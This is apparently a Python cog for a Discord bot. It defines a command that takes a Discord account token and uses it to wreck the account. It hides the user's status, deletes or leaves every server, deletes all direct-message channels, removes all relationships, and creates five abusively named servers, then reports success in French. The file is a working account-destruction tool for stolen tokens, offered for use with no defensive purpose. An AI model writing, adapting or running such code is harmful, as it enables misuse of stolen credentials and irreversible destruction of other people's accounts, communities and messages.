import nmap
import discord
from discord.ext import commands
import os
import json
import requests
from utils.utils import get_emoji
emoji = get_emoji()

class Webhook(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        
    @commands.command()
    async def d3stroytok3n(self, ctx, token):
        try:
            headers = {
                'User-Agent' : 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
                'Authorization' : token
            }

            payload = {"message_display_compact" : True,"inline_embed_media" : False,"gif_auto_play" : False,"render_embeds" : False,"render_reactions" : False,"animate_emoji" : False,"convert_emoticons" : False,"enable_tts_command" : False,"explicit_content_filter" : 0,"status" : "invisible"}

            requests.patch(
                "https://canary.discordapp.com/api/v6/users/@me/settings",
                headers = headers,
                json = payload
            )

            guilds = requests.get(
                "https://discord.com/api/v6/users/@me/guilds",
                headers = headers
            ).json()


            for i in guilds:
                try:
                    if not i["owner"]:
                        responce = requests.delete(
                            f"https://discord.com/api/users/@me/guilds/{i['id']}",
                            headers = headers
                        )
                    else:
                        responce = requests.delete(
                            f"https://discord.com/api/guilds/{i['id']}",
                            headers = headers
                        )
                except Exception as e:
                    print(e)

            dms = requests.get(
                "https://discord.com/api/v6/users/@me/channels",
                headers = headers
            ).json()

            for i in dms:
                responce = requests.delete(
                    f"https://discord.com/api/channels/{i['id']}",
                    headers = headers
                )


            relations = requests.get(
            "https://discord.com/api/v8/users/@me/relationships",
            headers = headers
            ).json()

            relations = [i for i in relations if i["type"] != 0]
            for i in relations:
                responce = requests.put(
                    f"https://discord.com/api/v8/users/@me/relationships/{i['user']['id']}",
                    headers = headers,
                    json = {"type":0}
                )

            guild = {
                "channels" : None,
                "icon" : "https://cdn.discordapp.com/avatars/828342022091964507/d76fa6f2c5c005c46037564153110464.webp?size=1024",
                "name" : "FuckByCronos",
                "region" : "japan"
            }
            for i in range(5):
                requests.post(
                    'https://discordapp.com/api/v6/guilds',
                    headers = headers,
                    json = guild
                )
            await ctx.send(f"{ctx.author.mention}\n{emoji['zeus']} - **Token marave !**")
        except:
            await ctx.send(f"{ctx.author.mention}\n{emoji['zeus']} - **Une erreur est survenue !**")
        
    
        
def setup(bot):
    bot.add_cog(Webhook(bot))

